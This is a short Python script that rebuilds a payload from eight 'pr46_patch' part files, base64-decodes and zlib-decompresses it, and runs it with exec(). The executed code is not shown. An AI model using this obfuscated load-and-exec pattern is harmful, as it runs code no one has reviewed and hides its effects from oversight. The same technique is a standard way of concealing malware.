from pathlib import Path
import base64
import zlib
payload = ''.join(Path(f'scripts/pr46_patch.part{i}').read_text() for i in range(8))
exec(zlib.decompress(base64.b64decode(payload)).decode())
